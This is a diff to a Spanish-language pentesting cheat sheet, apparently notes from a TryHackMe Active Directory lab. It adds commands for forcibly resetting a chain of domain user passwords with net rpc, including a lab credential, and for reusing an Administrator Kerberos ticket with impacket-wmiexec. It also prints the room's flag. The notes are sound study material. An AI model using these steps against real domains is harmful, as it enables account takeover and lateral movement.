@@ -40,6 +40,21 @@ net help user
 net help group
 ```
 
+**Cambiar la contraseña de un usuario de dominio** (`net rpc`, desde Linux) — usado en **Restablecer** para recorrer la cadena `SHAWNA_BRAY → CRUZ_HALL → DARLA_WINTERS`:
+
+```
+net rpc password "<usuario>" "<nueva_password>" -U "<DOMINIO>"/"<usuario_actual>"%'<password_actual>' -S "<DOMINIO>"
+```
+
+Ejemplo real:
+
+```
+net rpc password "SHAWNA_BRAY" "newP@ssw0rd2022" -U "THM.CORP"/"TABATHA_BRITT"%'marlboro(1985)' -S "THM.CORP"
+```
+
+- Cada eslabón de la cadena usa la credencial que acabas de cambiar en el paso anterior.
+- Es el equivalente por línea de comandos a lo que hace `ForceChangePassword` en BloodHound.
+
 ## 3. FTP — acceso anónimo
 
 ```
@@ -157,4 +172,49 @@ free -m     # memoria
 uptime      # carga y tiempo encendido
 ```
 
-> Nota: los comandos de *privesc* (`sudo find`, `ssh2john`…) viven en sus ficheros: `Escalada de privilegios Linux.md` y `Fuerza bruta y crackeo.md`.
+## 11. Leer ficheros y moverse por directorios en Windows
+
+Desde `cmd` o PowerShell (no hay `cat`/`ls` de Linux) — usado en **Restablecer** para leer `user.txt` y `root.txt`:
+
+```
+type archivo.txt                              # equivalente a cat
+type "C:\Users\administrator\Desktop\root.txt" # con ruta y espacios: entre comillas
+dir                                           # equivalente a ls
+cd C:\Users
+cd Desktop
+```
+
+Ejemplo real:
+
+```powershell
+C:\Users\Administrator\Desktop>type root.txt
+THM{RE_SET_AND_DELEGATE}
+```
+
+- Con espacios en la ruta hay que envolverla entre comillas dobles, si no `type` interpreta cada palabra como un argumento distinto.
+- El equivalente en la shell de **evil-winrm** es el mismo `type`, porque ejecuta comandos de Windows.
+
+## 12. Variables de entorno en Linux
+
+Necesario en **Restablecer** para reutilizar el ticket Kerberos de Administrator:
+
+```
+export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
+echo $KRB5CCNAME        # leer su valor
+unset KRB5CCNAME        # borrarla
+```
+
+- `export` define la variable **solo en la sesión actual** y la exporta a los procesos hijos (por eso el `impacket-wmiexec -k -no-pass` siguiente la encuentra).
+- Sin `export` (poniendo solo `KRB5CCNAME=...`) la variable queda local al intérprete y las herramientas de Impacket no la ven.
+- Se puede poner delante de un comando sin exportarla: `KRB5CCNAME=archivo.ccache impacket-wmiexec ...`.
+
+## 13. Editar ficheros de texto con nano
+
+```
+nano /etc/hosts
+```
+
+- `Ctrl+O` guarda, `Ctrl+X` sale, `Ctrl+W` busca.
+- En **Restablecer** se añadió `10.65.138.18 haystack.thm.corp` para que Kerberos resolviera el nombre del DC. La forma rápida de añadir la línea sin abrir el editor es `echo '<IP> <dominio>' >> /etc/hosts` (ver `Enumeracion web.md`).
+
+> Nota: los comandos de *privesc* (`sudo find`, `ssh2john`…) viven en sus ficheros: `Escalada de privilegios Linux.md` y `Fuerza bruta y crackeo.md`. Los de Active Directory de **Restablecer** (`bloodhound-python`, `GetNPUsers`, `getST`, `wmiexec`, `impacket-lookupsid`, Responder…) están en `SMB y Active Directory.md` y `Fuerza bruta y crackeo.md`.
